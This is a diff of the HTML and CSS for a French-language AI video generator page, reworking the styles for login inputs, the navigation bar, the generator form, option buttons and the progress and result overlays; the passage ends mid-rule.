@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
@@ -202,1834 +202,1031 @@
 
         .input-icon {
             position: absolute;
-            left: 16px;
+            left: 12px;
             top: 50%;
             transform: translateY(-50%);
-            width: 20px;
-            height: 20px;
-            color: var(--text-dim);
-            transition: color 0.3s ease;
-            pointer-events: none;
+            color: var(--text-muted);
+            font-size: 18px;
         }
 
-        .form-input {
+        .input-field {
             width: 100%;
-            padding: 14px 14px 14px 48px;
-            font-size: 15px;
-            font-family: inherit;
-            color: var(--text);
-            background: rgba(255,255,255,0.03);
+            padding: 12px 16px 12px 44px;
+            background: var(--bg-card);
             border: 1px solid var(--border);
-            border-radius: 12px;
-            outline: none;
+            border-radius: var(--radius-md);
+            color: var(--text);
+            font-size: 14px;
             transition: all 0.3s ease;
         }
 
-        .form-input::placeholder { color: var(--text-dim); }
-
-        .form-input:focus {
-            background: rgba(255,255,255,0.06);
-            border-color: rgba(255,0,110,0.4);
-            box-shadow: 0 0 0 3px rgba(255,0,110,0.08);
-        }
-
-        .login-forgot {
-            text-align: right;
-        }
-
-        .login-forgot a {
-            color: var(--primary);
-            text-decoration: none;
-            font-size: 13px;
-            font-weight: 500;
-        }
-
-        .login-forgot a:hover {
-            color: #ff4d9e;
-        }
-
-        .login-submit {
-            width: 100%;
-            padding: 14px;
-            font-size: 15px;
-            font-weight: 600;
-            color: white;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 24px rgba(255,0,110,0.25);
-        }
-
-        .login-submit:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 32px rgba(255,0,110,0.35);
-        }
-
-        .login-submit:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .login-footer {
-            text-align: center;
-            margin-top: 24px;
-            font-size: 14px;
-            color: var(--text-muted);
-        }
-
-        .login-footer a {
-            color: var(--primary);
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .login-footer a:hover {
-            color: #ff4d9e;
-        }
-
-        .google-sign-in-btn {
-            width: 100%;
-            padding: 16px;
-            font-size: 16px;
-            font-weight: 700;
-            color: white;
-            background: linear-gradient(135deg, #4285F4, #34A853);
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 24px rgba(66, 133, 244, 0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .google-sign-in-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 32px rgba(66, 133, 244, 0.4);
-        }
-
-        .google-sign-in-btn:active {
-            transform: translateY(0) scale(0.98);
-        }
-
-        .back-btn {
-            background: none;
-            border: none;
-            color: var(--primary);
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            padding: 8px 0;
-            margin-bottom: 16px;
-            transition: color 0.2s;
-        }
-
-        .back-btn:hover {
-            color: #ff4d9e;
-        }
-
-        /* ===== NAVBAR ===== */
-        .navbar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 100;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: var(--spacing-md) 5vw;
-            background: rgba(5,5,16,0.7);
-            backdrop-filter: blur(24px) saturate(180%);
-            border-bottom: 1px solid var(--border);
-            transition: all 0.3s ease;
-            gap: var(--spacing-lg);
-        }
-
-        .nav-brand {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            font-weight: 800;
-            font-size: 20px;
-            letter-spacing: -0.5px;
-            color: var(--text);
-            text-decoration: none;
-            flex-shrink: 0;
-        }
-
-        .nav-logo {
-            width: 38px;
-            height: 38px;
-            border-radius: var(--radius-md);
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 20px rgba(255,0,110,0.3);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .nav-logo::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, transparent 40%, rgba(255,255,255,0.25) 50%, transparent 60%);
-            animation: logoShine 4s infinite;
-        }
-
-        @keyframes logoShine {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        .nav-center {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex: 1;
-            justify-content: center;
-        }
-
-        .nav-links {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .nav-link {
-            padding: 8px 16px;
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--text-muted);
-            text-decoration: none;
-            border-radius: var(--radius-md);
-            transition: all 0.2s ease;
-            cursor: pointer;
-        }
-
-        .nav-link:hover, .nav-link.active {
-            color: var(--text);
-            background: rgba(255,255,255,0.06);
-        }
-
-        .nav-right {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            flex-shrink: 0;
-        }
-
-        .nav-credits {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            padding: 8px 16px;
-            background: rgba(255,255,255,0.04);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
-            font-size: 13px;
-            font-weight: 600;
-        }
-
-        .nav-avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--secondary), var(--accent));
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 13px;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-
-        .nav-avatar:hover { transform: scale(1.1); }
-
-        /* ===== HERO ===== */
-        .hero {
-            position: relative;
-            z-index: 10;
-            padding: 140px 5vw 80px;
-            text-align: center;
-            max-width: 900px;
-            margin: 0 auto;
-        }
-
-        .hero-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            padding: 8px 18px;
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--primary);
-            background: rgba(255,0,110,0.08);
-            border: 1px solid rgba(255,0,110,0.15);
-            border-radius: 100px;
-            margin-bottom: 28px;
-            animation: badgeIn 0.6s ease-out 0.2s both;
-        }
-
-        .hero-badge .pulse {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--primary);
-            box-shadow: 0 0 10px var(--primary);
-            animation: pulse 2s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(0.8); }
-        }
-
-        @keyframes badgeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .hero h1 {
-            font-size: clamp(36px, 5.5vw, 72px);
-            font-weight: 900;
-            line-height: 1.1;
-            letter-spacing: -2px;
-            margin-bottom: 20px;
-            animation: titleIn 0.8s ease-out 0.3s both;
-        }
-
-        .hero h1 .gradient-text {
-            background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            background-size: 200% 200%;
-            animation: gradientShift 4s ease infinite;
-        }
-
-        @keyframes gradientShift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-
-        @keyframes titleIn {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .hero-subtitle {
-            font-size: clamp(16px, 1.8vw, 22px);
-            color: var(--text-muted);
-            line-height: 1.6;
-            max-width: 600px;
-            margin: 0 auto 20px;
-            animation: fadeIn 0.8s ease-out 0.5s both;
-        }
-
-        .hero-social {
-            font-size: 13px;
-            color: var(--text-dim);
-            margin-bottom: 40px;
-            animation: fadeIn 0.8s ease-out 0.6s both;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* ===== VIDEO GENERATOR ===== */
-        .generator {
-            position: relative;
-            z-index: 10;
-            padding: 0 5vw var(--spacing-2xl);
-            max-width: 900px;
-            margin: 0 auto;
-            animation: fadeIn 0.8s ease-out 0.7s both;
-        }
-
-        .generator-card {
-            background: var(--bg-elevated);
-            backdrop-filter: blur(40px);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-xl);
-            padding: var(--spacing-xl);
-            box-shadow: 0 25px 80px -20px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.02) inset;
-            transition: border-color 0.3s, box-shadow 0.3s;
-        }
-
-        .generator-card:focus-within {
-            border-color: rgba(255,0,110,0.3);
-            box-shadow: 0 25px 80px -20px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,0,110,0.1) inset, 0 0 60px rgba(255,0,110,0.06);
-        }
-
-        .generator-section {
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .generator-section:last-child {
-            margin-bottom: 0;
-        }
-
-        .generator-label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: var(--spacing-sm);
-        }
-
-        .prompt-textarea {
-            width: 100%;
-            min-height: 120px;
-            padding: var(--spacing-md);
-            font-size: 17px;
-            font-family: inherit;
-            color: var(--text);
-            background: rgba(255,255,255,0.02);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
-            outline: none;
-            resize: vertical;
-            line-height: 1.6;
-            transition: border-color 0.3s, background 0.3s;
-        }
-
-        .prompt-textarea:focus {
-            border-color: rgba(255,0,110,0.3);
-            background: rgba(255,255,255,0.04);
-        }
-
-        .prompt-textarea::placeholder {
-            color: var(--text-dim);
-        }
-
-        .prompt-tools {
-            display: flex;
-            gap: var(--spacing-sm);
-            margin-top: var(--spacing-sm);
-            flex-wrap: wrap;
-        }
-
-        .btn-small {
-            padding: 8px 14px;
-            font-size: 12px;
-            font-weight: 500;
-            background: rgba(255,255,255,0.04);
-            border: 1px solid var(--border);
-            color: var(--text-muted);
-            border-radius: var(--radius-sm);
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .btn-small:hover {
-            background: rgba(255,0,110,0.1);
-            border-color: rgba(255,0,110,0.25);
-            color: var(--text);
-        }
-
-        /* Reference Image Upload */
-        .reference-upload {
-            border: 2px dashed var(--border);
-            border-radius: var(--radius-lg);
-            padding: var(--spacing-lg);
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .reference-upload:hover {
-            border-color: rgba(255,0,110,0.3);
-            background: rgba(255,0,110,0.02);
-        }
-
-        .reference-upload.has-image {
-            border-style: solid;
-            background: rgba(255,0,110,0.08);
-        }
-
-        .upload-placeholder {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: var(--spacing-sm);
-        }
-
-        .upload-icon {
-            font-size: 32px;
-            opacity: 0.6;
-        }
-
-        .upload-text {
-            font-size: 14px;
-            color: var(--text-muted);
-        }
-
-        .upload-hint {
-            font-size: 12px;
-            color: var(--text-dim);
-            margin-top: var(--spacing-sm);
-        }
-
-        .reference-preview {
-            width: 100%;
-            height: 200px;
-            border-radius: var(--radius-md);
-            background: rgba(255,255,255,0.05);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .reference-preview img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .reference-remove {
-            position: absolute;
-            top: var(--spacing-sm);
-            right: var(--spacing-sm);
-            width: 32px;
-            height: 32px;
-            background: rgba(0,0,0,0.6);
-            border: none;
-            border-radius: 50%;
-            color: white;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.2s;
-        }
-
-        .reference-remove:hover {
-            background: rgba(239, 68, 68, 0.8);
-        }
-
-        /* Settings Grid */
-        .settings-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: var(--spacing-md);
-            margin-top: var(--spacing-md);
-        }
-
-        .setting-group {
-            display: flex;
-            flex-direction: column;
-            gap: var(--spacing-sm);
-        }
-
-        .setting-pills {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
-            gap: var(--spacing-sm);
-        }
-
-        .pill {
-            padding: 10px 14px;
-            font-size: 13px;
-            font-weight: 500;
-            background: rgba(255,255,255,0.04);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
-            cursor: pointer;
-            transition: all 0.2s;
-            text-align: center;
-        }
-
-        .pill:hover {
-            background: rgba(255,255,255,0.06);
+        .input-field:hover {
             border-color: var(--border-hover);
         }
 
-        .pill.active {
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: rgba(255,0,110,0.05);
+            box-shadow: 0 0 0 3px rgba(255,0,110,0.1);
+        }
+
+        .submit-btn {
+            padding: 12px 24px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            border: none;
+            border-radius: var(--radius-md);
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 24px rgba(255,0,110,0.3);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(255,0,110,0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="mesh-bg"></div>
+    <div class="stars"></div>
+    <div class="particles" id="particlesContainer"></div>
+
+    <!-- FIN PARTIE 1 - Continuez avec partie2.html -->
+</body>
+</html><!-- PARTIE 2 - Styles avancés + contenu principal -->
+
+        /* ===== NAVBAR ===== */
+        nav {
+            position: relative;
+            z-index: 10;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(5,5,16,0.4);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        nav .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        nav .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .nav-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(255,0,110,0.2);
+        }
+
+        .nav-avatar:hover {
+            transform: scale(1.05);
+        }
+
+        .user-info-panel {
+            position: absolute;
+            top: 80px;
+            right: 24px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            width: 300px;
+            display: none;
+            z-index: 100;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
+
+        .user-info-panel.active {
+            display: block;
+        }
+
+        .user-info-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .user-info-header h3 {
+            font-size: 14px;
+        }
+
+        .close-user-panel {
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        .user-info-item {
+            margin-bottom: 12px;
+            font-size: 12px;
+        }
+
+        .user-info-item label {
+            display: block;
+            color: var(--text-muted);
+            margin-bottom: 4px;
+        }
+
+        .user-info-item span {
+            display: block;
+            color: var(--text);
+            word-break: break-all;
+        }
+
+        .logout-btn {
+            width: 100%;
+            padding: 8px 16px;
+            background: rgba(239,68,68,0.1);
+            border: 1px solid rgba(239,68,68,0.3);
+            border-radius: var(--radius-md);
+            color: var(--danger);
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .logout-btn:hover {
+            background: rgba(239,68,68,0.2);
+        }
+
+        /* ===== MAIN CONTAINER ===== */
+        .container {
+            position: relative;
+            z-index: 5;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        .page-section {
+            padding: 60px 0;
+        }
+
+        /* ===== GENERATOR SECTION ===== */
+        .generator {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 48px;
+            align-items: start;
+        }
+
+        .generator-content h1 {
+            font-size: 56px;
+            font-weight: 900;
+            line-height: 1.2;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .generator-content p {
+            font-size: 18px;
+            color: var(--text-muted);
+            margin-bottom: 32px;
+            line-height: 1.8;
+        }
+
+        .feature-list {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-bottom: 40px;
+        }
+
+        .feature-item {
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+
+        .feature-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .feature-text {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        /* ===== GENERATOR FORM ===== */
+        .generator-form {
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 32px;
+            backdrop-filter: blur(12px);
+        }
+
+        .form-section-title {
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: var(--text-muted);
+            margin-bottom: 12px;
+        }
+
+        .prompt-input-wrap {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .prompt-input {
+            width: 100%;
+            min-height: 120px;
+            padding: 16px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-md);
+            color: var(--text);
+            font-family: inherit;
+            font-size: 14px;
+            resize: vertical;
+            transition: all 0.3s ease;
+        }
+
+        .prompt-input:hover {
+            border-color: var(--border-hover);
+        }
+
+        .prompt-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: rgba(255,0,110,0.02);
+            box-shadow: 0 0 0 3px rgba(255,0,110,0.1);
+        }
+
+        .input-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+        }
+
+        .char-count {
+            color: var(--text-muted);
+        }
+
+        .enhance-btn {
+            background: none;
+            border: none;
+            color: var(--accent);
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+        }
+
+        .enhance-btn:hover {
+            background: rgba(58,134,255,0.1);
+        }
+
+        /* ===== OPTIONS GRID ===== */
+        .options-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .option-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .option-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
+            gap: 8px;
+        }
+
+        .option-btn {
+            padding: 8px 12px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-md);
+            color: var(--text);
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .option-btn:hover {
+            border-color: var(--border-hover);
+            background: rgba(255,255,255,0.02);
+        }
+
+        .option-btn.active {
             background: linear-gradient(135deg, var(--primary), var(--secondary));
             border-color: transparent;
             color: white;
-            box-shadow: 0 4px 16px rgba(255,0,110,0.25);
+            box-shadow: 0 4px 16px rgba(255,0,110,0.3);
         }
 
-        .advanced-toggle {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            padding: var(--spacing-md) 0;
-            cursor: pointer;
-            color: var(--text-muted);
-            font-size: 13px;
-            font-weight: 500;
+        /* ===== ACTION BUTTONS ===== */
+        .action-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .btn {
+            padding: 12px 24px;
             border: none;
-            background: none;
-        }
-
-        .advanced-toggle:hover {
-            color: var(--text);
-        }
-
-        .chevron {
-            transition: transform 0.3s;
-        }
-
-        .advanced-toggle.open .chevron {
-            transform: rotate(180deg);
-        }
-
-        .advanced-settings {
-            display: none;
-            padding-top: var(--spacing-md);
-            border-top: 1px solid var(--border);
-            gap: var(--spacing-md);
-        }
-
-        .advanced-settings.open {
+            border-radius: var(--radius-md);
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
             display: flex;
-            flex-direction: column;
-        }
-
-        /* Enhance Prompt Panel */
-        .enhance-prompt-panel {
-            display: none;
-            position: fixed;
-            inset: 0;
-            z-index: 150;
-            background: rgba(5,5,16,0.95);
-            backdrop-filter: blur(20px);
             align-items: center;
             justify-content: center;
-            padding: var(--spacing-lg);
-        }
-
-        .enhance-prompt-panel.active {
-            display: flex;
-        }
-
-        .enhance-dialog {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-xl);
-            padding: var(--spacing-xl);
-            max-width: 600px;
-            width: 100%;
-        }
-
-        .enhance-header {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-md);
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .enhance-spinner {
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255,0,110,0.3);
-            border-top-color: var(--primary);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .enhance-result {
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .enhance-result textarea {
-            width: 100%;
-            min-height: 120px;
-            padding: var(--spacing-md);
-            font-size: 14px;
-            font-family: inherit;
-            color: var(--text);
-            background: rgba(255,255,255,0.02);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
-            resize: vertical;
-        }
-
-        .enhance-actions {
-            display: flex;
-            gap: var(--spacing-md);
-        }
-
-        .btn-large {
-            flex: 1;
-            padding: 12px 24px;
-            font-size: 14px;
-            font-weight: 600;
-            border-radius: var(--radius-md);
-            border: none;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-family: inherit;
+            gap: 8px;
         }
 
         .btn-primary {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
             color: white;
-            box-shadow: 0 4px 20px rgba(255,0,110,0.25);
+            box-shadow: 0 8px 24px rgba(255,0,110,0.3);
         }
 
-        .btn-primary:hover {
+        .btn-primary:hover:not(:disabled) {
             transform: translateY(-2px);
-            box-shadow: 0 8px 28px rgba(255,0,110,0.35);
+            box-shadow: 0 12px 32px rgba(255,0,110,0.4);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
 
         .btn-secondary {
-            background: rgba(255,255,255,0.04);
+            background: rgba(255,255,255,0.05);
             color: var(--text);
             border: 1px solid var(--border);
         }
 
         .btn-secondary:hover {
-            background: rgba(255,255,255,0.06);
+            background: rgba(255,255,255,0.08);
             border-color: var(--border-hover);
         }
 
-        /* Generate Button */
-        .generate-section {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-top: var(--spacing-lg);
-            padding-top: var(--spacing-lg);
-            border-top: 1px solid var(--border);
-            gap: var(--spacing-md);
-        }
-
-        .generate-info {
-            font-size: 13px;
-            color: var(--text-muted);
-        }
-
-        .generate-btn {
-            padding: 14px 32px;
-            font-size: 15px;
-            font-weight: 700;
-            color: white;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            border: none;
-            border-radius: var(--radius-md);
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            box-shadow: 0 4px 24px rgba(255,0,110,0.3);
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-            position: relative;
-            overflow: hidden;
-            white-space: nowrap;
-        }
-
-        .generate-btn::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, rgba(255,255,255,0.2), transparent);
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .generate-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 32px rgba(255,0,110,0.4);
-        }
-
-        .generate-btn:hover::before {
-            opacity: 1;
-        }
-
-        .generate-btn:active {
-            transform: translateY(0) scale(0.97);
-        }
-
-        .generate-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .generate-btn span {
-            position: relative;
-            z-index: 1;
-        }
-
-        .btn-spinner {
+        .spinner {
             width: 16px;
             height: 16px;
-            border: 2px solid rgba(255,255,255,0.3);
+            border: 2px solid rgba(255,255,255,0.2);
             border-top-color: white;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             display: none;
         }
 
-        /* ===== GENERATION STATE ===== */
-        .generation-overlay {
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== ENHANCEMENTS PANEL ===== */
+        .enhance-panel {
             position: fixed;
             inset: 0;
-            z-index: 200;
-            background: rgba(5,5,16,0.95);
-            backdrop-filter: blur(20px);
+            background: rgba(0,0,0,0.7);
             display: none;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: var(--spacing-2xl);
-            padding: var(--spacing-lg);
+            z-index: 40;
+            padding: 20px;
         }
 
-        .generation-overlay.active {
+        .enhance-panel.active {
             display: flex;
         }
 
-        .progress-ring-container {
-            position: relative;
-            width: 160px;
-            height: 160px;
-        }
-
-        .progress-ring {
-            width: 100%;
-            height: 100%;
-            transform: rotate(-90deg);
-        }
-
-        .progress-bg {
-            fill: none;
-            stroke: rgba(255,255,255,0.05);
-            stroke-width: 4;
-        }
-
-        .progress-fill {
-            fill: none;
-            stroke: url(#progressGradient);
-            stroke-width: 4;
-            stroke-linecap: round;
-            stroke-dasharray: 502;
-            stroke-dashoffset: 502;
-            transition: stroke-dashoffset 0.4s ease;
-        }
-
-        .progress-percent {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 32px;
-            font-weight: 800;
-        }
-
-        .generation-steps {
-            display: flex;
-            flex-direction: column;
-            gap: var(--spacing-md);
-            max-width: 400px;
-            width: 100%;
-        }
-
-        .generation-step {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-md);
-            padding: var(--spacing-md);
-            background: rgba(255,255,255,0.02);
-            border-radius: var(--radius-md);
-            font-size: 14px;
-            color: var(--text-muted);
-        }
-
-        .step-icon {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 10px;
-            flex-shrink: 0;
-        }
-
-        .step-icon.pending {
-            border: 2px solid rgba(255,255,255,0.2);
-        }
-
-        .step-icon.active {
-            border: 2px solid var(--primary);
-            animation: pulse 2s ease-in-out infinite;
-        }
-
-        .step-icon.done {
-            background: var(--success);
-            color: white;
-        }
-
-        .generation-time {
-            font-size: 13px;
-            color: var(--text-dim);
-        }
-
-        /* ===== VIDEO RESULT ===== */
-        .result-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 200;
-            background: rgba(5,5,16,0.95);
-            backdrop-filter: blur(20px);
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: var(--spacing-lg);
-            gap: var(--spacing-lg);
-            overflow-y: auto;
-        }
-
-        .result-overlay.active {
-            display: flex;
-        }
-
-        .result-container {
-            max-width: 800px;
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            gap: var(--spacing-lg);
-        }
-
-        .result-player {
-            width: 100%;
-            aspect-ratio: 16/9;
-            border-radius: var(--radius-xl);
-            background: linear-gradient(135deg, rgba(255,0,110,0.15), rgba(131,56,236,0.15));
-            border: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .result-player::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
-            pointer-events: none;
-        }
-
-        .result-play {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            border: none;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 8px 40px rgba(255,0,110,0.4);
-            transition: all 0.3s ease;
-            position: relative;
-            z-index: 1;
-        }
-
-        .result-play:hover {
-            transform: scale(1.1);
-        }
-
-        .result-play svg {
-            width: 30px;
-            height: 30px;
-            margin-left: 4px;
-        }
-
-        .result-info {
-            display: flex;
-            flex-wrap: wrap;
-            gap: var(--spacing-sm);
-            justify-content: center;
-        }
-
-        .result-tag {
-            padding: 8px 18px;
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--text-muted);
-            background: var(--bg-elevated);
-            border: 1px solid var(--border);
-            border-radius: 100px;
-        }
-
-        .result-prompt {
-            padding: var(--spacing-lg);
